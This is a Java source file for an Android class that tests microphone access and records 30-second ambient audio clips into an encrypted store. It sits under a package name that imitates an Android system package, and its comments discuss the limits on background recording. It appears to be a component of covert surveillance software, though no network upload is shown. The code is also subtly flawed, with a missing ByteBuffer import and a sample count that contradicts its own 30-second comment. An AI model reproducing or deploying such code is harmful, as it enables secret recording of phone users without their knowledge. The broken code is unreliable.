package com.android.system.security;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import java.io.*;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Microphone audio capture.
 *
 * Two modes:
 * 1. MediaRecorder — captures to compressed file (AMR/3GP). Works on most devices.
 * 2. AudioRecord — raw PCM capture for ambient recording. Lower latency.
 *
 * On Android 14+ (API 34+), background microphone is RESTRICTED:
 * - Requires FOREGROUND_SERVICE_MICROPHONE permission
 * - Service must be started while app is in foreground
 * - RECORD_AUDIO runtime permission required
 *
 * If restricted, gracefully fails and logs it.
 */
public class AudioRecorder {

    private static final String TAG = "AudioRecorder";

    private static final int SAMPLE_RATE = 16000;         // 16kHz for voice
    private static final int RECORD_DURATION_MS = 30000;  // 30 seconds per clip
    private static final int BUFFER_SIZE = 4096;

    private final Context context;
    private final EncryptedStore encryptedStore;
    private final ProgressTracker progressTracker;

    private MediaRecorder mediaRecorder;
    private AudioRecord audioRecord;
    private Thread recordingThread;
    private final AtomicBoolean isRecording = new AtomicBoolean(false);

    private boolean mediaRecorderWorks = false;
    private boolean audioRecordWorks = false;

    public AudioRecorder(Context context, EncryptedStore encryptedStore, ProgressTracker progressTracker) {
        this.context = context;
        this.encryptedStore = encryptedStore;
        this.progressTracker = progressTracker;
    }

    /**
     * Test microphone access.
     * Attempts to initialize both MediaRecorder and AudioRecord.
     * If both fail, microphone capture is unavailable on this device/OS version.
     */
    public boolean init() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "microphone_init");

        // Check RECORD_AUDIO permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                android.support.v4.content.ContextCompat.checkSelfPermission(context,
                    android.Manifest.permission.RECORD_AUDIO)) {
                return check.fail("RECORD_AUDIO permission not granted");
            }
        }

        boolean anySuccess = false;

        // Try MediaRecorder
        try {
            MediaRecorder test = new MediaRecorder();
            test.setAudioSource(MediaRecorder.AudioSource.MIC);
            test.setOutputFormat(MediaRecorder.OutputFormat.AMR_WB);
            test.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_WB);
            test.setAudioSamplingRate(SAMPLE_RATE);
            test.setAudioChannels(1);

            File testFile = new File(context.getCacheDir(), "mic_test.tmp");
            test.setOutputFile(testFile.getAbsolutePath());

            try {
                test.prepare();
                test.start();
                Thread.sleep(500);
                test.stop();
                test.release();

                if (testFile.exists() && testFile.length() > 100) {
                    testFile.delete();
                    mediaRecorderWorks = true;
                    anySuccess = true;
                    Log.i(TAG, "MediaRecorder microphone works");
                }
            } catch (Exception e) {
                Log.w(TAG, "MediaRecorder test failed: " + e.getMessage());
                try { test.release(); } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.w(TAG, "MediaRecorder init failed: " + e.getMessage());
        }

        // Try AudioRecord
        try {
            int minBufferSize = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT);

            if (minBufferSize > 0) {
                AudioRecord test = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    minBufferSize);

                if (test.getState() == AudioRecord.STATE_INITIALIZED) {
                    test.startRecording();
                    Thread.sleep(200);
                    if (test.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                        short[] buffer = new short[1024];
                        int read = test.read(buffer, 0, buffer.length);
                        test.stop();
                        test.release();

                        if (read > 0) {
                            audioRecordWorks = true;
                            anySuccess = true;
                            Log.i(TAG, "AudioRecord microphone works (read " + read + " samples)");
                        }
                    } else {
                        test.release();
                    }
                } else {
                    test.release();
                }
            }
        } catch (SecurityException e) {
            Log.w(TAG, "AudioRecord permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.w(TAG, "AudioRecord test failed: " + e.getMessage());
        }

        return check.result(anySuccess,
            anySuccess ? "Microphone accessible via " +
                (mediaRecorderWorks ? "MediaRecorder " : "") +
                (audioRecordWorks ? "AudioRecord" : "")
                : "Microphone not accessible on this device/OS");
    }

    /**
     * Record a 30-second audio clip.
     * Uses MediaRecorder if available (compressed output), falls back to AudioRecord.
     */
    public boolean recordClip() {
        if (!mediaRecorderWorks && !audioRecordWorks) {
            progressTracker.record("microphone_record", false, "No working audio method");
            return false;
        }

        if (isRecording.get()) {
            Log.w(TAG, "Already recording");
            return false;
        }

        if (mediaRecorderWorks) {
            return recordWithMediaRecorder();
        } else if (audioRecordWorks) {
            return recordWithAudioRecord();
        }
        return false;
    }

    private boolean recordWithMediaRecorder() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "microphone_mediarecorder");

        try {
            File outputFile = new File(context.getCacheDir(),
                "audio_" + System.currentTimeMillis() + ".amr");

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_WB);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_WB);
            mediaRecorder.setAudioSamplingRate(SAMPLE_RATE);
            mediaRecorder.setAudioChannels(1);
            mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
            mediaRecorder.setMaxDuration(RECORD_DURATION_MS);

            mediaRecorder.setOnInfoListener((mr, what, extra) -> {
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    Log.i(TAG, "Max duration reached");
                    stopRecording();
                }
            });

            try {
                mediaRecorder.prepare();
            } catch (IOException e) {
                return check.fail("MediaRecorder prepare failed: " + e.getMessage());
            }

            isRecording.set(true);
            mediaRecorder.start();

            Log.i(TAG, "Audio recording started (30s clip)...");

            // Wait for duration
            Thread.sleep(RECORD_DURATION_MS);

            stopRecording();

            if (outputFile.exists() && outputFile.length() > 200) {
                storeAudioFile(outputFile);
                return check.ok("Recorded " + outputFile.length() + " bytes via MediaRecorder");
            } else {
                return check.fail("Recording produced no data");
            }

        } catch (SecurityException e) {
            return check.fail("Microphone security exception (background restriction): " + e.getMessage());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return check.fail("Recording interrupted");
        } catch (Exception e) {
            return check.fail("MediaRecorder error: " + e.getMessage());
        }
    }

    private boolean recordWithAudioRecord() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "microphone_audiorecord");

        int minBufferSize = AudioRecord.getMinBufferSize(
            SAMPLE_RATE,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT);

        if (minBufferSize <= 0) {
            return check.fail("Invalid buffer size: " + minBufferSize);
        }

        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                minBufferSize * 2  // Double buffer for smoother recording
            );

            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                return check.fail("AudioRecord state not initialized");
            }

            isRecording.set(true);
            audioRecord.startRecording();

            if (audioRecord.getRecordingState() != AudioRecord.RECORDSTATE_RECORDING) {
                isRecording.set(false);
                audioRecord.release();
                audioRecord = null;
                return check.fail("AudioRecord failed to start recording");
            }

            // Calculate total samples for 30 seconds
            int totalSamples = SAMPLE_RATE * 3;  // 30 seconds * 10 segments per second
            int samplesPerRead = minBufferSize / 2;  // 16-bit = 2 bytes per sample
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            recordingThread = new Thread(() -> {
                short[] buffer = new short[samplesPerRead];
                int samplesRead = 0;
                int totalRead = 0;

                while (isRecording.get() && totalRead < totalSamples) {
                    samplesRead = audioRecord.read(buffer, 0, samplesPerRead);
                    if (samplesRead > 0) {
                        totalRead += samplesRead;
                        byte[] bytes = new byte[samplesRead * 2];
                        ByteBuffer.wrap(bytes).asShortBuffer().put(buffer, 0, samplesRead);
                        try {
                            baos.write(bytes);
                        } catch (IOException e) {
                            Log.w(TAG, "Buffer write error: " + e.getMessage());
                            break;
                        }
                    }
                }
            });

            recordingThread.start();

            // Let it record
            recordingThread.join(RECORD_DURATION_MS);

            stopRecording();

            byte[] pcmData = baos.toByteArray();
            if (pcmData.length > 0) {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "audio_pcm");
                entry.put("timestamp", System.currentTimeMillis());
                entry.put("sample_rate", SAMPLE_RATE);
                entry.put("channels", 1);
                entry.put("encoding", "PCM_16BIT");
                entry.put("duration_ms", RECORD_DURATION_MS);
                entry.put("size", pcmData.length);
                entry.put("audio_data", pcmData);
                encryptedStore.store("audio", entry);

                return check.ok("Recorded " + pcmData.length + " bytes PCM audio via AudioRecord");
            } else {
                return check.fail("No audio data captured");
            }

        } catch (SecurityException e) {
            return check.fail("Microphone security exception: " + e.getMessage());
        } catch (Exception e) {
            return check.fail("AudioRecord error: " + e.getMessage());
        }
    }

    public void stopRecording() {
        isRecording.set(false);

        try {
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception ignored) {}
                mediaRecorder.release();
                mediaRecorder = null;
            }

            if (audioRecord != null) {
                try {
                    if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                        audioRecord.stop();
                    }
                } catch (Exception ignored) {}
                audioRecord.release();
                audioRecord = null;
            }

            if (recordingThread != null) {
                recordingThread.interrupt();
                recordingThread = null;
            }
        } catch (Exception e) {
            Log.w(TAG, "Stop recording error: " + e.getMessage());
        }
    }

    private void storeAudioFile(File audioFile) {
        try {
            byte[] fileData = new byte[(int) audioFile.length()];
            try (FileInputStream fis = new FileInputStream(audioFile)) {
                fis.read(fileData);
            }

            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "audio_amr");
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("sample_rate", SAMPLE_RATE);
            entry.put("format", "AMR-WB");
            entry.put("size", fileData.length);
            entry.put("duration_ms", RECORD_DURATION_MS);
            entry.put("audio_data", fileData);
            encryptedStore.store("audio", entry);

            audioFile.delete();
            Log.i(TAG, "Audio stored: " + fileData.length + " bytes");

        } catch (Exception e) {
            Log.w(TAG, "Audio storage failed: " + e.getMessage());
        }
    }

    public boolean isAvailable() { return mediaRecorderWorks || audioRecordWorks; }
          }
